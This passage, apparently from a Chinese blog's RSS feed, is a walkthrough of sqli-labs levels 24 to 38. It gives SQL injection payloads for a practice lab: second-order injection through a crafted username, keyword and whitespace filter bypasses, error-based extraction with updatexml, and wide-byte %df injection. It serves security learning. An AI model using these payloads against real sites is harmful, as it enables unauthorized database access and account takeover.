&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/10.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 先注册一个用户名为 &lt;code&gt;admin&#39; #&lt;/code&gt; 的账号，虽然注册时会被转义，但是数据还是会被存入数据库，所以在接下来其他地方被调用时就会出现漏洞，即在改密码时，SQL 语句拼接出 &lt;code&gt;&amp;quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; #&#39; and password=&#39;$curr_pass&#39; &amp;quot;&lt;/code&gt; ，就可以修改 admin 的密码，实现 SQL 注入&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/11.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 就可以用 admin 账户登录&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/12.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-25&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-25&#34;&gt;#&lt;/a&gt; Less-25&lt;/h2&gt;
&lt;p&gt;AND 和 OR 都被过滤，但是 UNION 没有被过滤可以实现注入，并且可以通过双写来 Bypass 过滤： &lt;code&gt;id=-1&#39; oorr 1=1--+&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-25a&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-25a&#34;&gt;#&lt;/a&gt; Less-25a&lt;/h2&gt;
&lt;p&gt;和 25 一样&lt;/p&gt;
&lt;h2 id=&#34;less-26&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-26&#34;&gt;#&lt;/a&gt; Less-26&lt;/h2&gt;
&lt;p&gt;过滤了空格，本想着用 &lt;code&gt;/**/&lt;/code&gt;  绕过，发现还是不行，一看源码：&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/13.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 过滤了大部分的东西，本来想着绕过空格的方式：&lt;br&gt;
%09 TAB 键（水平）、%0a 新建一行、%0c 新的一页、%0d return 功能、%0b TAB 键（垂直）、% a0 空格，发现其中 % a0 以及 %0b 可用，&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/14.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 或者需要用 () 绕过，使用报错注入的方式，构造 payload： &lt;code&gt;?id=-1%27||extractualue(1,concat(0x7e,(select%20database()),0x7e))||%271%27=%271&lt;/code&gt; &lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/15.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 &lt;code&gt;0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1&lt;/code&gt;  爆表名&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/16.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-26a&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-26a&#34;&gt;#&lt;/a&gt; Less-26a&lt;/h2&gt;
&lt;p&gt;基于绕过过滤空格后的正确注入（可用 % a0 绕过），或者基于 bool 盲注，因为没有错误回显，所以不能报错注入&lt;/p&gt;
&lt;h2 id=&#34;less-27&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-27&#34;&gt;#&lt;/a&gt; Less-27&lt;/h2&gt;
&lt;p&gt;题目说过滤了 UNION 和 SELECT，但是查看源代码发现可以大小写绕过。。。同时过滤了空格和注释夫，可以用上面的方法绕过，payload“ &lt;code&gt;?id=0&#39;%a0unIon%a0seleCt%a01,2,3||&#39;1&#39;=&#39;1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-27a&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-27a&#34;&gt;#&lt;/a&gt; Less-27a&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;&lt;/code&gt;  闭合，其余同上&lt;/p&gt;
&lt;h2 id=&#34;less-28&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-28&#34;&gt;#&lt;/a&gt; Less-28&lt;/h2&gt;
&lt;p&gt;虽然题目说过滤了 union 和 select，但是发现仍然是可以用的，不知道是环境问题还是题目本来就是这样的，同时是用 &lt;code&gt;(&#39;&lt;/code&gt;  闭合的，且过滤了空格等，课用上面的方法绕过&lt;br&gt;
 payload： &lt;code&gt;?id=0&#39;)%a0union%a0select%a01,2,3||(&#39;1&#39;=&#39;1&lt;/code&gt; &lt;br&gt;
 后来才发现题目是过滤了 &lt;code&gt;union select&lt;/code&gt;  这个词组，因为中间加了 &lt;code&gt;%a0&lt;/code&gt; , 刚好绕过了检测&lt;/p&gt;
&lt;h2 id=&#34;less-28a&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-28a&#34;&gt;#&lt;/a&gt; Less-28a&lt;/h2&gt;
&lt;p&gt;同上，但是貌似减少课过滤的东西，更简单了？？&lt;/p&gt;
&lt;h2 id=&#34;less-29&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-29&#34;&gt;#&lt;/a&gt; Less-29&lt;/h2&gt;
&lt;p&gt;尝试一下 &lt;code&gt;?id=0%27union%20select%201,2,3--+&lt;/code&gt; , 发现好像啥也没过滤？？？&lt;br&gt;
然后就和第一关一样了。。。&lt;/p&gt;
&lt;h2 id=&#34;less-30&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-30&#34;&gt;#&lt;/a&gt; Less-30&lt;/h2&gt;
&lt;p&gt;先用单引号闭合发现没用，再用双引号闭合发现报错，接下来就和上面的一样了&lt;/p&gt;
&lt;h2 id=&#34;less-31&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-31&#34;&gt;#&lt;/a&gt; Less-31&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;)&lt;/code&gt;  闭合，其余一样&lt;/p&gt;
&lt;h2 id=&#34;less-32&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-32&#34;&gt;#&lt;/a&gt; Less-32&lt;/h2&gt;
&lt;p&gt;宽字节注入，payload： &lt;code&gt;?id=0%df%27%20union%20select%201,2,3--+&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-33&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-33&#34;&gt;#&lt;/a&gt; Less-33&lt;/h2&gt;
&lt;p&gt;同上&lt;/p&gt;
&lt;h2 id=&#34;less-34&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-34&#34;&gt;#&lt;/a&gt; Less-34&lt;/h2&gt;
&lt;p&gt;这里的提交方式是 post，但是又用 / 转义了’，一种方式是将 utf-8 转换为 utf-16 或 utf-32，例如将 ’ 转为 utf-16 为�’ ，但是这 % df 仍然可以用&lt;br&gt;
，再加上报错注入：&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/17.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-35&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-35&#34;&gt;#&lt;/a&gt; Less-35&lt;/h2&gt;
&lt;p&gt;直接注。。。&lt;/p&gt;
&lt;h2 id=&#34;less-36&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-36&#34;&gt;#&lt;/a&gt; Less-36&lt;/h2&gt;
&lt;p&gt;% df 宽字节注入&lt;/p&gt;
&lt;h2 id=&#34;less-37&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-37&#34;&gt;#&lt;/a&gt; Less-37&lt;/h2&gt;
&lt;p&gt;这一次就没有像 34 关一样简单，% df 没有办法用了，但是可以将 utf-8 转换为 utf-16 或 utf-32，构造 payload“ &lt;code&gt;111�&#39; union select 1,(select database())--+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/18.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-38&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-38&#34;&gt;#&lt;/a&gt; Less-38&lt;/h2&gt;
&lt;p&gt;直接注。。。&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
